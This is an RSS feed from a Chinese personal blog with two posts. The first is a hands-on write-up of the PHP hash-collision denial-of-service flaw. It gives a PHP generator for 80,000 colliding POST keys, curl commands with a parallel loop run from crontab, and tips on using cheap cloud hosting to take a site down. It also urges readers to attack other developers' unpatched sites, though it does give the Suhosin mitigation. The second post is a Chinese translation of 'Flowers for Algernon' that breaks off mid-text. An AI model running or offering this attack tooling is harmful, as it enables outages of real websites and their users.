<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0"><channel>
<title>Soulogic 灵魂逻辑</title><link>http://soulogic.com/</link><description>硬盘里埋藏着我的光荣与梦想，我要用键盘把他们挖出来</description><language>zh-cn</language><generator>Soulogic RSS lib</generator><lastBuildDate>Fri, 03 Feb 2012 12:14:24 +0800</lastBuildDate><item><title>实践 PHP Hash 冲突问题</title><link>https://soulogic.com/archives/423</link><author>zhengkai@gmail.com (郑凯)</author><category>代码 Coding</category><guid>soulogic.blog.423</guid><pubDate>Fri, 03 Feb 2012 01:15:44 +0800</pubDate><description><![CDATA[<p>好友 <a href="https://twitter.com/druggo">Druggo Yang</a> 又给我了个链接 <a href="http://thexploit.com/sec/critical-php-remote-vulnerability-introduced-in-fix-for-php-hashtable-collision-dos/">http://thexploit.com/sec/critical-php-remote-vulnerability-introduced-in-fix-for-php-hashtable-collision-dos/</a>，但是，很尴尬的，我看不明白。</p><p>但我觉得应该把这个问题搞清楚，所以做了一晚上试验。</p><p>先确认了，如果 POST <span class="monospace">123=345</span>，在 <span class="monospace">$_POST</span> 里，对 key 做 <span class="monospace">gettype</span> 是 integer，也就是说 <a href="http://nikic.github.com/2011/12/28/Supercolliding-a-PHP-array.html">之前的例子</a> 依然有效。</p><p>POST 几万个key，我选择的方法是构造一个大文本文件，再用 cURL 发出去</p><p>这个大文本用 PHP 生成（或者你不用 PHP，我也很乐意提供一个 <a href="https://soulogic.com/upload/136">现成的</a>）</p><ol class="php"><li><span><span class="open_tag">&lt;?php</span><br /></span></li><li><span><span class="variable">$num</span> = <span class="lnumber">80000</span>;<br /></span></li><li><span><span class="variable">$file</span> = <span class="constant_encapsed_string">&quot;/tmp/curlrc&quot;</span>;<br /></span></li><li><span><br /></span></li><li><span><span class="variable">$size</span> = <span class="lnumber">65536</span>;<br /></span></li><li><span><span class="string">file_put_contents</span>(<span class="variable">$file</span>, <span class="constant_encapsed_string">&quot;data-binary 0=1&quot;</span>);<br /></span></li><li><span><span class="for">for</span> (<span class="variable">$i</span> = <span class="lnumber">1</span>; <span class="variable">$i</span> &lt; <span class="variable">$num</span>; <span class="variable">$i</span><span class="inc">++</span>) {<br /></span></li><li><span><span class="tab">	</span><span class="string">file_put_contents</span>(<span class="variable">$file</span>, <span class="constant_encapsed_string">&quot;&amp;&quot;</span>.(<span class="variable">$i</span> * <span class="variable">$size</span>).<span class="constant_encapsed_string">&quot;=1&quot;</span>, <span class="string">FILE_APPEND</span>);<br /></span></li><li><span>}</span></li></ol><p>得到这个文件后 cURL 调用方式为</p><blockquote class="code"><p>curl -K /tmp/curlrc 目标.com</p></blockquote><p>如果是想跟某网站动真格的，可以用后台循环来，并放到 crontab 里每分钟循环一遍</p><blockquote class="code"><p>for i in {1..200};do curl -K curlrc.txt 目标.com & done</p></blockquote><p>对于目标网站的要求是，PHP 版本 &#60; 5.3.9，没有安装 Suhosin 扩展。刚才又问了 Druggo 才搞明白，Suhosin 分 patch 和 extension 两部分，后者才提供了和这次问题相关的两个参数：</p><blockquote class="code"><p>suhosin.post.max_vars<br />suhosin.request.max_vars</p></blockquote><p>默认值在<a href="http://www.hardened-php.net/suhosin/configuration.html">网站</a>上写的是 200，实际是 1000。当然，问题就在于 Suhosin 在各大 Linux 发行版里都只默认装了 patch 那部分，如果只是用默认的话，这回就危险了。</p><p>还有一些其他的限制，例如，Nginx 默认接收 POST 上限是 1MB（我给的那个大小正合适）</p><p>每个 cURL 都只是让一个 PHP 进程达到超时效果，成本是接近 1MB 的 POST，所以要搞死一个稍大点的网站，需要让他的 fastcgi 全部跑光，或者 Apache 内存跑满，基本就是每分钟上百或几百次 POST，还是得费点力气的，虽然相比其他拒绝服务攻击，这算挺低廉的了。我建议如果你实在是想把某个网站搞摊个一天半天的，可以考虑一下 Amazon AWS 的 <a href="http://aws.amazon.com/free/">免费试用</a>，就算付费，流量也才 $0.12/GB，一般般的网站10块钱够搞它一两天的。</p><p>我把自己的 max_vars 设成 100000，然后对自己机器来了一下看效果，结果 uptime 就到 10 了，由于第一次听到 Mac mini 风扇有这么响，着实心疼了一下，赶紧把 FPM 停掉了</p><p>补救办法也很简单，装 Suhosin extension，在 Ubuntu 下是</p><blockquote class="code"><p>sudo apt-get install php5-suhosin</p></blockquote><p>之后重启下 FPM 或者 Apache 就可以了，其他什么都不用改</p><p>另外，如果中招了，PHP error log 里会有大量的超时错误</p><blockquote class="code"><p>[02-Feb-2012 23:57:10] PHP Fatal error: &#160;Maximum execution time of 60 seconds exceeded in Unknown on line 0</p></blockquote><p>为什么我把这事说的这么详细？你知道吗，全国有那么多傻逼拿着着跟我差不太多的薪水，干着有辱行业的蠢事，毫不关心自己的工作。他们极大的降低了整个行业的水准，让大家都觉得写 PHP 的全是傻逼——就是这些人搞的。现在，我号召你们，无论出于私仇还是义愤，拿起手中的 bash（如果是 zsh 更好），以 Zend 的名义净化他们！让他们知道不装 Suhosin 就得死！</p><p><img src="http://rss.soulogic.com/track/423" /></p>]]></description></item>
<item><title>献给阿尔杰农的花</title><link>https://soulogic.com/archives/422</link><author>zhengkai@gmail.com (郑凯)</author><category>科幻 Science Fiction</category><guid>soulogic.blog.422</guid><pubDate>Wed, 01 Feb 2012 22:16:06 +0800</pubDate><description><![CDATA[<p>本文获1960年雨果奖</p><p>翻译：胡跃明<br />录入：晨星</p><p>进步报告之一</p><p>1965年3月5日</p><p>斯特劳斯大夫叫我从现在开始记下我脑子里想的及碰到的每一件事情。我不知道其中的缘由，但他告诉我这样做很重要，他们藉此决定是否用我。我希望他们用我，因为齐妮安小姐跟我说他们能让我变得聪明些。我想显得聪明又能干。我叫查理·乔丹，两周前刚过了我的三十七岁生日。没别的好写了，今天就先到此为止。</p><p>进步报告之二</p><p>3月6日</p><p>今天我接受了一次测试。我想我是失败了。可能他们将下再用我了。事情是这样的，房间里有一位很精神的年轻小伙子，手里拿着些上面溅满墨水的白色卡片。他问我说：“查理，在卡片上你看到什么了吗？”尽管我衣兜里揣着吉祥物，我还是给吓坏了。因为当我还是一个在学校念书的小孩时，我就老是通不过测验而且常打翻墨水瓶。我告诉他我看到了一块墨斑。他说：“没错。”这让我感到好受了些，我想大概完事了。可当我站起来要走的时候，他阻止了我。他说：“查理，坐下。我们还没结束呢。”此后的事，我就有些记不清了。可他想让我说出墨斑里有什么。我什么也看不出来。他还说里面有图案，别人能看出来。而我却没能看到，尽管我已竭尽全力地看了。我拿着它，近看，远看都试了试。然后说，如果戴上眼镜我能看得清楚些。通常我只是在看电影或电视时才戴眼镜。我又告诉他说眼镜在大厅的壁橱里面。拿来之后，我要求重新看一遍，心想这次我肯定能发现其中的东西了。我尽力去看，但是仍然没能发现图案什么的，只看到墨水。我告诉那小伙子说我得弄副新眼镜。他在一张纸上写了点什么东西。我真怕通不过测试。于是又补充说那是一个周边有小尖突的非常漂亮的墨斑。他一脸悲哀。显然事实并非像我所说的那样。我求他再让我试一次。这回，我会看出其中的图案的。我只是有时不那么灵光而已。在为智力低下的成年人开设的齐妮安小姐的班里我也是一个在阅读方面不怎么灵光的人。但我非常用功。他给了我一个机会。让我看那一张溅满红、蓝两色墨水的卡片。他十分和蔼可亲并且像齐妮安小姐一样讲得挺慢。他介绍说那是一种叫原始震慑的测试。他说别人能看到墨斑里的东西。我叫他指给我看。他则叫我想想，我跟他说我觉得那只是一块墨斑而已，但这显然不对，他又说：“墨斑使你回想起什么了吗？试着设想那里有东西。”我若有其事地闭上眼睛想了好久。然后我告诉他我设想有一支自来水笔，漏得满台布都是墨水。随后，他站起来走出去了，我想我没能通过原始震慑测试。</p><p>进步报告之三</p><p>3月7日</p><p>斯特劳斯大夫和耐缪尔大夫叫我别再为墨斑担忧了。我向他们诉说我没把墨水溅到卡片上去，可我也没能看出墨斑里的东西。他们说或许他们还会继续用我。我告诉他们齐妮安小姐除了拼写与阅读处，从未给过我像昨天那样的测试。他们说齐妮安小姐告诉他们我是成人夜校里最棒的学生，因为我最用功而且的确想学点东西。他们问我：“查理，你为啥独自一人去成人夜大学习？你是怎么找到夜大的？”我回答说我向别人打听，有人就告诉我得到哪儿学读书、写字。大夫问我为什么要去上夜大。我跟他们说，我想一辈子聪明而不是傻乎乎的。不过要想聪明可不简单。他们又说：“你要知道，要聪明可能只是暂时的？”我回答说：“我明白，齐妮安小姐告诉过我，我不在乎这是否让人难受。”</p><p>同一天，迟些时候我接受了更多不可理喻的测试。给我测试的那位可人的女士告诉我这种测试的名称。我问她怎么拼写以便我能把它写进我的进步报告。她告诉我那叫“主题统觉测试”。前两个字我不认识，可我知道“测试”的意思。“要么就通过测试，要么就得分很低，”她这样说。这一测试看起来挺简单，因为我能看出图案，可偏偏这次她没叫我告诉她其中的图案的模样，这把我给弄糊涂了。我跟她说，昨天的那个男的要我告诉他在墨斑里看到的图案，今天怎么……可她却告诉我说，那无关紧要。她叫我就图片中的人物编造故事。我问她：“你怎能讲有关你从未碰到过的人的故事呢？再说，我为什么要编造谎言呢？我可不想撒谎，要知道以前我才老是被逮住的。”她告诉我这个测试和原始震慑测试是用于判断个性的。我放声大笑，说：“怎能通过墨斑、画片来判断一个人的个性呢？”她有点恼火了，收起了照片。我也不在乎了，反正我是笨得无药可救。我想我没通过这项测试。</p><p>稍许，几个穿白大褂的男人把我带到医院的另一个地方，让我玩一个游戏，这游戏就像是与一只白鼠赛跑。他们管那老鼠叫阿尔杰农，它被放在一只有各种七拐八弯的墙一样的隔离板的盒子里。他们给了我一支铅笔，一张画有各种线条的纸，还有许多盒子，一头标上起点字样，另一头则标有终点字样。他们称之为“迷阵”，我和阿尔杰农有同样的迷阵要闯。我弄不明白为什么他们说我与阿尔杰农有同样的迷阵。阿尔杰农用的是一只盒子，而我用的是一张纸。我心里有些纳闷，可嘴里没说出来。还过也没时间说了，赛跑已经开始了。其中的一个男的拿着一只表，可他竭力想把它藏好以便不让我看到。既然这样我就尽然不去看。不过这玩意弄得我挺紧张。总之，那测试让我感觉糟透了。他们让我与阿尔杰农闯了十种不同的迷阵，阿尔杰农每次都赢。我弄不懂为什么样那白鼠竟如此聪明，或许因为它是一只白老鼠的缘故吧。大概白鼠要比其他老鼠聪明。</p><p>进步报告之四</p><p>3月8日</p><p>他们还将用我，我激动得没法写下去了。耐缪尔大夫与斯特劳斯大夫在是否继续用我的问题上发生了争执。斯特劳斯大夫把我带进办公室时，耐缪尔大夫恰好也在。耐缪尔大夫对继续用我有点疑惑。可斯特劳斯大夫告诉他齐妮安小姐推荐说我是所教的所有学生中最棒的一个。我喜欢齐妮安小姐，因为她是个很棒的老师。她跟我说：“查理，现在有个机会，如果你自愿参加这一实验，或许你会变得聪明些。尽管他们还不清楚这能否持久有效，但毕竟这是一次难得的机会。”那也是我接受她的建议的原因。尽管我很是害怕，因为她告诉我得动手术。她又说：“查理，别怕，你做了很多得到却很少，我想你应该通过手术来获得更多。”当耐缪尔大夫与斯特劳斯大夫因我的事而争论时，我十分害怕。斯特劳斯大夫说我有一些很不错的东西。比如动机单纯。可我从不知道我有什么动机。当他说并非每个智商值68的人都会有我这样的动机时，我自豪极了。我不知道何之所谓动机，这东西来自哪里。但他们说阿尔杰农也有。阿尔杰农的动机来自放在盒子里的奶酪。不过，我的动机不可能是奶酪，因为这星期我没碰过任何奶酪。随后，斯大夫又对耐缪尔大夫说了些我听不懂的东西。当他们在争论的时候，我记下了一些话。斯特劳斯大夫说：“耐缪尔大夫，我知道查理不是你想要的第一个充当培养高智能超人的对象，但是大多数像他这样智能低下的人不仅心怀敌意而且不肯合作。又通常十分冷漠让人难以接近。查理本质不错，而且他对此有兴趣，也乐意取悦别人。”耐缪尔大夫却说：“记住，他将是第一个以手术方式把他的智力提高三倍的人。”斯特劳斯回答说：“没错。看看，像他这样在如此低的智力年龄下能学会读书、写字就如同你我在没有别人帮忙的情况下学会爱因斯坦的相对论一样，是了不起的成就。这显示了他极强的动机。相比这下，这的确了不起，我说还是用查理吧。”</p><p>他们讲得太快了，我不能记下所有的对话，不过听起来好像斯大夫是站在我这边的，可耐缪尔大夫则不然，后来耐缪尔大夫点头说：“好吧！也许你是对的。我们继续用查理。”听到他说这个，我兴奋得跳起来，向前握住他的手，感谢他对我这么好。我对他说：“谢谢您！大夫，我不会让你失望的。我说话算数，手术后一定努力变得聪明起来，我会尽力而为的。”</p><p>进步报告之五</p><p>3月10日</p><p>我给吓坏了。许多在这里的工作人员、护士，还有那些给我做过测试的人都给我送来了糖果并祝我走运。我也希望我会走运，还带上了吉祥物的三叶草、幸运币及马掌（吉祥物的一种）。当我就要去医院时偏偏碰上了一只黑鼠，让我感到挺不安的。可斯特劳斯大夫却说：“查理，别迷信，我们干的是科学。“管他呢，再说我已带着吉祥物。我问斯特劳斯大夫，手术后我能否在赛跑中赢阿尔杰农。他说也许会的。如果手术成功，我就可以用行动来证明我能像它一样聪明，等着瞧吧！可能还会比它更聪明呢！然后我就能更好地读书写字像别人一样知道许多事情。如果这种手术证明可行的话，他们会让世界上的每个人都变得更聪明。</p><p>那天早上，他们什么也没给我吃。我真不知道吃东西与变得聪明会有什么联系。我饿得要命。然而耐缪尔大夫甚至拿走了我的糖果盒。耐缪尔大夫的脾气可真够臭的。斯大夫安慰我说，手术后我可以要回糖果盒，但手术前不能吃东西……</p><p>进步报告之六</p><p>3月15日</p><p>手术倒不疼痛，而且是在我睡着的时候进行的。今天他们取下了我的头、眼睛上的绷带，以便我能写我的进步报告。耐缪尔看了我写的一些报告，告诉我说我把“进步”这个字给拼错了。而且告诉我该怎样拼写及怎样拼写“报告”这一个字。我努力记住这两个字。我对单词的拼写总是记不牢。斯大夫说我可以记下我所碰到的任何事情，但最好多谈点自己的感想，我跟他说我不知道怎么去想时，他要我试着做做看。于是我把眼睛被绷带蒙上的所有时光全部拿来试着想东西，但一无所获。我不知道如何想。如果我向他求助或许他会告诉我怎样去想。聪明人都想些什么呢？我想他们想的会是些非常美妙的东西。我多希望我也知道一些美妙的东西呀！</p><p>进步报告之七</p><p>3月19日</p><p>一切照旧，我不停地接受各种测试，此外还与阿尔杰农进行各式各样的赛跑。我恨透了那老鼠，它老是击败我。斯特劳斯大夫说我必须做那些迷阵游戏。还说过段时间我得再次接受那些测试。那些墨斑还有那些画片都是些无聊至极的东西。我想画男人与女人的像，但我连人的轮廓也画不出来。</p><p>由于一直在一个劲地想东西，我的头也痛起来了。斯特劳斯大夫是我的朋友，可他不帮助我。他也不告诉我该想些什么。我何时才会变得聪明呢！齐妮安小姐也不来看我。我觉得写那些进步报告也是蠢事一桩。</p><p>进步报告之八</p><p>3月23日</p><p>我要回厂工作了。他们说回厂工作更好些，但是我不能告诉任何人我动手术的目的，而且每晚下班之后我得去医院待一小时。他们每月付我钱作为我学着变聪明的酬金。很高兴重新回去工作，我怀念我那份工作、厂里的朋友还有在厂里的那份快乐。</p><p>斯特劳斯大夫要我继续记下我碰到的事。不过今后不必每天写了。如果我想到什么或碰到什么特别的事情，那么就把它们记下来。他叫我别泄气，变聪明需要时间而且进展不快。阿尔杰农花了很长时间才变得比以前聪明了三倍。它之所以能击败我，是因为它已经动过那种手术。经他这么一说，我感觉好多了，在做那些迷阵游戏方面，我准能比一般的老鼠快，或许哪天我还能击败那尔杰农，那可是件值得一提的事！到目前为止，阿尔杰农的才智看上去能保持下去。</p><p>3月25日</p><p>（我再也不必在交给耐缪尔大夫每周一次的报告开头写上“进步报告”的字样了。我只要写上日期就行了，这下可省事多了。）</p><p>今天，我在厂里过得很开心。乔·卡普问道：“喂，查理，你在哪里动的手术，他们对你干了些什么，是否给你加了些脑髓之类的东西。”我刚想告诉他真相，但想起斯特劳斯大夫曾叫我别说这事，于是就没搭理他。后来弗兰克·雷利开玩笑说：“查理，忘了带钥匙的话该怎么开门呀？”我给逗乐了。他们喜欢我，是我的真哥们。</p><p>有时有人会说：“喂，看哪！乔真是查理·乔丹第二。”我不懂他们为什么这样说。不过他们每每都为此大笑。今天早上，阿莫斯·鲍尔格，厂里的四号人物，在对办公室勤务员埃尔尼大喊大叫时嘴里叫的却是我的名字。原来埃尔尼弄丢了一只文件袋。他是这样说的：“埃尔尼，你是否也想变成查理·乔丹一样？”我弄不懂他讲的话，我可从未弄丢过文件袋。</p><p>3月28日</p><p>今晚，斯特劳斯大夫来到我房间，想知道为何原来该去医院的却没去。我对他说我再也不乐意与阿尔杰农比赛了。他说我可以暂且不做那些迷阵游戏，但我得去医院。他还给了我一件礼物，但所谓的礼物只是借给我用用而已。起先，我还以为是台电视机，事实并非如此。他叫我在睡觉的时候打开它。我说：“别画了，我都睡觉了，还打开它干吗？睡着了还能看到什么呢！”但是他说：“如果想变聪明，就照我说的去做。”我跟他说：“我觉得我没指望会变聪明的。”他拍拍我的肩说：“查理，你只是还没意识到，但你一直都在变得聪明起来。暂时你还不会察觉到。”我想他只是心肠好，让我感到好受点而已，因为我的确没变聪明。</p><p>哦，对了！我差点忘了说一件事。我问斯特劳斯大夫什么时候我可以回到齐妮安小姐的班里。他跟我说，我不用去。过些时候齐妮安小姐会到医院来，对我开始个别辅导。我对她在我动手术时不来看我一事感到万分的气愤。不过我喜欢她，我俩会重归于好的。</p><p>3月29日</p><p>那该死的电视机让我整晚没睡着。一些家伙在我耳边彻夜胡乱吼叫些莫名其妙的东西，我怎能睡着呢？还有些非常怪诞的画面，我醒着的时候都弄不懂电视里说的东西，何况我睡着了呢！</p><p>斯特劳斯大夫说：“随他去。”他还说，我睡着的时候，脑子还在学东西。这些将有助于理解齐妮安小姐将在医院给我上的课。（不过后来我发觉课是在一个实验室里上的，而不是在医院里。）一切全疯了。如果睡着的时候，人会变聪明，那人们又何必去上学呢？我想这样做是不会有结果的。我渐渐习惯了看一直都在放得很晚很晚的节目。不过就是没让我变得聪明点。或许得在睡眠状态下看那些东西。</p><p>进步报告之九</p><p>4月3日</p><p>斯特劳斯大夫教我如何把电视机的音量开小。现在我能睡着了。我什么都没听到。不过我还是不懂里面讲的那些东西。早上我把这些东西重放几遍，看看在我睡着的时候我都有学了些什么。不过好像我什么也没学到，齐妮安小姐说或许里面讲的是另一种语言或其他什么的。不过多数情况下，听上去是英语，只是比我的六年级老师戈尔德小姐讲得还要快。我记得她讲话快得让我听不懂。</p><p>我对斯特劳斯大夫说：“在睡梦里变得聪明有啥用处？我想在醒的时候聪明点。”他回答说：“这没啥两样的。”你有两种精神状态：潜意识和意识。两者相互不沟通，那也是做梦的缘由。哦，我的妈。自从有了那台夜间电视机。我一直在做一些乱七八糟的梦。我忘了问他是否只有我，还是每人都有两种精神状态。我从斯特劳斯大夫给我的字典里查到了“潜意识”这个单词。字典是这样定义的：形容词类，精神活动的机能，但与意识不级并存。比如，欲望与潜意识不能相容。释义还有，但我还是弄不懂其含义。对我这类天智愚笨的人来说，这不是本好字典。</p><p>不过，头痛是因晚会而起。厂里的朋友乔·卡普和弗兰克·雷利邀请我去英格西斯沙龙喝几杯。我不好喝酒，可他们说去玩玩，挺人意思的。的确那天我玩得很开心。乔·卡普叫我给小姐淙一下在厂里我是如何打扫厕所的，还给我弄来只拖把，我照办了。我还告诉他们多尼根先生曾称赞我是最好的杂役，因为我热爱本职、恪尽职守，除了那次动手术，从未迟到或旷工过。这引得他们大笑一场。我还告诉他们齐妮安小姐跟我说：“查理，你应为你的工作感到自豪，因为你干得太棒了。”大家都开怀大笑。玩得很是开心。他们给我喝了许多东西。乔说查理喝醉后可好玩了。我当时没听懂他的话，只知道大家都喜欢我，我们都很开心。我有些迫不及待，想早日成为我的好朋友乔·卡普和弗兰克·雷利一样聪明。</p><p>晚会怎么结束的我已记不得了。只记得我出去为乔和弗兰克买报纸和咖啡什么的，可等我回来的时候人影都没了。很迟了我还在到处找他们。以后的事就记不清了。我想多半是睡着了或身体不适了什么的。房东费利恩太太告诉我是一个好心的警察把我带回家的。我有些头痛，全身青天一块紫一块的，头上还有一个大肿块。我想可能是摔的。但乔·卡普跟我说有时警察也会痛打醉鬼的。可我对他讲的话不以为然。齐妮安小姐说过警察是帮助别人的。不过我头痛得厉害，感觉极差且全身疼痛。以后再也不喝酒了。</p><p>4月6日</p><p>我赢了阿尔杰农！要不是实验员布尔特告诉我，我还知道我赢了。然而第二次我却因兴奋过头而输掉了。比赛还结束我就从椅子上摔了下来，自然就输掉了。不过此后，我又赢了它八次。我肯定已经变得聪明，能击败像阿尔杰农这样聪明的老鼠了。可我就是没察觉到我已比以前聪明了。我还想与阿尔杰农再决高低，可布尔特说今天就此打住。他们让我摆弄了会儿阿尔杰农。它还真不赖，柔软得像团棉絮，还朝我眨着眼睛。当它睁开眼的时候，我可以看见它粉红色的眼睑内缘。</p><p>我说我想喂养它，因为我对打败它心存歉意。再说我想与它友好相处成为朋友。布尔特却说：不行！阿尔杰农是一只非同寻常的老鼠，接受过与我一样的手术。也是所有动物中唯一到目前为止没出现智力衰退迹象的。还说阿尔杰农是如此智力出众以至于给它喂食前都得让它解决一个问题，打比方，阿尔杰农要得到食物得过一道门，而门上的锁每次都在换，每次想吃东西就得重学一样新本领。这让我很是难受，要是它没学会就得挨饿。</p><p>我觉得只有通过测验之后才能给吃的是不对的。要是让耐缪尔大夫每次吃东西前都得过一关测试，他会感觉如何？我会成为阿尔杰农的朋友的。</p><p>4月9日</p><p>今晚下班后，齐妮安小姐到了实验室。看上去她见到我很高兴，但有些惊慌，我叫她别担心，我还没变聪明。她不自然地笑了。她说：“查理，我对你有信心，在阅读与单词拼写方面，你已竭力超过了其他所有的人。往最坏处想，至少你能在短时间内保持目前的智力水平。再说你在为科学作贡献呢！”</p><p>我们正在学一本很难的书，像这么难的书我以前从未读过。这书叫《鲁宾逊·克罗索》，讲的是一个只身一人困于荒岛的人的故事。这人很聪明，能想出各种各样的办法。他建起了房子，弄到了食物；还是个游泳好手。唯一让我为他感到难过的是，他孤身一人，没有朋友。但我想岛上肯定还有其他人，因为在一张照片里，他带着一把雨伞在看一行人的脚印。我希望他能交上朋友，不再孑然一身。</p><p>4月10日</p><p>齐妮安小姐教了我怎样记住单词。她告诉我先看一会儿单词，然后闭上眼睛，嘴里一遍一遍地念，直到记住为止。我弄不清楚：既然单词through（“通过”之意）中的字母组合“ough”与单词threw（“扔，掷”之意）“ew”一样发[u:]音，即“ough”=“ew”，为什么单词“足够的（地）”和单词“坚强的”只能拼写为“enough”和“tough”却不拼写为“enew”及“tew”。我想这两个单词应该拼写为“enuff”和“tuff”。我在没变聪明前一直都是这样拼写的。这把我弄得稀里糊涂，但齐妮安小姐却跟我说单词的拼写是没道理好讲的，是约定俗成的东西。</p><p>4月14日</p><p>我把《鲁宾逊·克罗索》看完了。我还想知道有关鲁宾逊的其他经历，但齐妮安小姐却告诉我手头只有这些资料了。不知到底为什么。</p><p>4月15日</p><p>齐妮安小姐说我学得很快。她读了一些我写的进步报告后，以一种很好玩的眼光看着我。她说我是个很不错的人，这一点别人都会知道的。我问她为什么这样说。她却说不必细问，但是万一我发现别人并不像我想象的那样好的话也不必难过。不过她又说，其中有一点原因可以告诉我，那就是像我这样缺乏天资的人，事实上已比其他脑子正常但很少用他们的脑子的人做得得多了。我跟她说我所有的朋友都很聪明但他们都很善良，他们喜欢我，从没做过对我不好的事情。那时怎的什么东西掉进她眼里去了，她只好跑到洗手间去了。</p><p>4月16日</p><p>今天，我学了，逗号，（，）这就是逗号——一个长尾巴的句号，齐妮安，说逗号很重要，因为，逗号会让你的作文，显得更好，她说，有些人，会损失，一大笔钱，如果一个逗号，没有，点在正确的位置。我没有，钱，我也不明白，一个逗号，能使你避免，损失一笔钱，</p><p>可是她说，所有人，都用逗号，所以我也得用，逗号，</p><p>4月17日</p><p>我用错了逗号。齐妮安小姐叫我从字典里查出那些很长的单词，记住它们的拼写。我问她既然我已经知道怎样念了，又何必把它们给记牢。她跟我说那是我接受的教育的一部分。所以从今往后我得把那些不清楚怎样拼写的字全查出来。那样做的确很费时，但我的确记住了一些。我只要查过一遍后就能拼写正确。我也是通过这样的方式学到“标点”这个词的。齐妮安小姐说“逗号”是标点符号之一，我还有许多其他的标点符号要学。我说在我看来所有的标点都得有尾巴，但她说不是这样的。</p><p>你得把它们结合起来用，她演示？给我看“怎能样把它们综合起来（用！，现在；我能够！把所有”的标点符号结合起来用，在！写作过程中？我有，许多！规则？要学；但是我已把一些符号记在脑子里。我？对一件事很满意，那就是亲爱的齐妮安小姐：（商业信件就是这样开头的）在我请教她的时候，她，总是给我’一个说法”。她是个天’才！我希望！我也能像，她；一样聪明”（标点符号，真；有趣！）</p><p>4月18日</p><p>我真是个笨蛋。我竟然听不懂她讲的东西。昨晚我看了语法书，书上讲得清清楚楚的。齐妮安小姐讲的与书上写的一模一样，但是我就是听不懂。半夜里我起来时，好讲的东西我脑子里又一清二楚了。</p><p>齐妮安小姐说是那台在我睡着的时候工作的电视机帮了我的忙，还说我已上了一个台阶。</p><p>等我弄清楚怎样使标点符号后，我把所有的进步报告从头至尾读了一遍。哦，我的天。我的拼写和标点简直太离谱了。我告诉齐妮安小姐我得把所有的东西看一遍把里面所有的错误都改正过来。可她没同意，对我说：“查理，不行，耐缪尔大夫要这些进步报告原封不动地保存着。他想让你看看自己的进步，因此这些进步报告经过照相复制后仍由你保管。你进步很快。”</p><p>我感觉好极了。课后我的心情才平静下来，跟阿尔杰农玩了会儿。我们俩不再赛跑了。</p><p>4月20日</p><p>我感觉不舒服。不是那种要看医生的不舒服。胸口感觉空空的像被人打了一样，同时又感到火烧一样的难受。我不想把这个写下的，但我想这可能挺重要，我得记下来。今天我生平第一次呆在家里没去上班。</p><p>昨晚，乔·卡普和弗兰克·雷利邀请我参加了一个晚会。有许多来自厂里的男、女职工。我还没忘掉上次喝得太多的那份难受劲，所以我对乔说我什么也不想喝。于是他给了我一杯可乐。味道怪怪的，我想大概是我嘴巴没味道引起的。</p><p>我们都玩得很尽兴。乔叫我跟海伦跳一曲，还说海伦会教我舞步的。我摔倒了好几次。我弄不懂为啥我老是绊在别人伸出来的脚上，而我和海伦的身边并没人在跳舞，当我从地上爬起来的时候，我看到了乔脸上的表情。那表情让我感到有些好玩。一个女孩说了一句：“他这人挺好玩的。”其他人都笑了起来。</p><p>弗兰克说：“我倒不觉得这有多少好笑的，因为在英格西斯沙龙晚会上我们曾叫他替我们去买报纸，随后我们便悄然离开。”</p><p>“看哪，他脸红了。”</p><p>“他不好意思得脸红了。查理脸红了。”</p><p>“喂，海伦，你跟查理做了些什么？我可从未看到他脸红过。”</p><p>我不知道该做什么，走到哪里去躲起来。大家都看着我，笑话我；我真像给剥光了衣服一样。我想把自己给藏起来。我跑到街上呕吐起来，然后走回家。好玩的是，我一直不知道乔和弗兰克及其他人叫我去他们那儿是为了拿我开心。现在我知道了他们说的“学乔丹”的含义了。我感觉受到了侮辱。</p><p>进步报告之十一*</p><p>*原著如此，没有“进步报告之十”。</p><p>4月21日</p><p>我还是没去厂里。我叫房东费利恩太太打电话告诉多尼根先生说我病了。费利恩太太用一种十分古怪的眼光看着我，近段时间她看上去有些怕我。</p><p>我想我得弄清楚为什么别人笑话我。我想了许多。觉得是因为我太笨的缘故，笨得以至于不知道自己在做傻事。人们总事嘲笑那些不会像他们一样做事情的傻瓜。</p><p>不管怎么说，现在我知道我每天都有正变得聪明起来。我知道怎样用标点，拼写也正确。我想把字典里所有的生字、难字全查出来，并且记住它们。我还在大量阅读，齐妮安说我的阅读速度非常的快。有时我理解了我在读的东西，并且记住了。许多次我闭上眼睛回想读过的某一页，所有的东西都像图片一样再现出来。</p><p>除了历史、地理和算术，齐妮安小姐还叫我开始学几门外语。斯特劳斯大夫给了我更多的带子，供我在睡觉的时候播放。我还上弄不清楚潜意识和意识是如何运作的，但斯特劳斯大夫叫我别操那分心。他要我保证一周后我开始修大学课程时不涉猎任何有关心理学的书籍，直到他允许我看为止。</p><p>今天我感觉好多了，但是我还是对那些因为我不聪明而老是嘲笑、戏弄我的人感到有些恼火。当我变得像斯特劳斯许喏的那样聪明，智商值有68乘以3的时候，我就能同常人一样：人们就会喜欢我、友好地待我了。</p><p>我不清楚何之所谓智商。耐缪尔大夫说智商是用来衡量一个人的聪明程度的，就像药店里用来称重量的秤一样。但是在这一点上斯特劳斯大夫与他分歧很大，在他看来智商根本不是用来衡量智力高低的；智商只能表明你能达到多少聪明，就像量杯外壁的刻度，只有你把东西装进量杯后才能使其具有实在意义。</p><p>我就这个问题请教了给我做智力测试的，研究阿尔杰农的布尔特，他说两位大夫全错了。（他是在我保证不把他说的话告诉两位大夫后才说的。）布尔特说智商能衡量包括你已学会的一些东西在内的许多不同的东西，不过这根本没什么意思。</p><p>我还是没弄懂智商这东西，只知道我的智商值很快就要超过200了。我不想说什么东西，但如果他们也不知道智商是什么、来自哪里，我就不明白他们会有发言权。我弄不清楚他们是怎么知道你的智商是多少的。</p><p>耐缪尔大夫说明天我得做一次罗夏测试看是怎么一回事。我想知道那是啥玩意儿。</p><p>4月22日</p><p>我弄清了所谓的罗夏测试是怎么一回事。这测试手术前我做过，也就是那个溅满墨迹的硬纸片的测试，给我做测试的也还是原先的那个人。</p><p>那些墨迹吓得我要死。我知道他要叫我找我找不出的那些的那些图案。我暗自问自己是否有知道隐含其中的图案的途径存在。或许压根儿就没什么图案。或许这只不过是一个小伎俩，看看我是否笨到拼命找那些根本不存在的东西。想用这些乱七八糟的东西让我对他感到恼火。</p><p>“好了，查理，”他说：“还记得吗？你以前看过这些卡片。”</p><p>“当然记得。”</p><p>从我讲话的口气中他察觉出我有些生气，这让他好生吃惊。“当然，你能记得，现在我想让你看这个，你认为这会是个什么东西？在这卡片上你看到了什么，别人能从这些墨斑里看出各种各样的东西。告诉我你能看到什么，其中的东西又让你想起了什么。”</p><p>我有些震惊。他问的完全出乎我的意料。“你是说那些黑斑中并没有图案隐含其中？”</p><p>他皱了皱眉头，拿下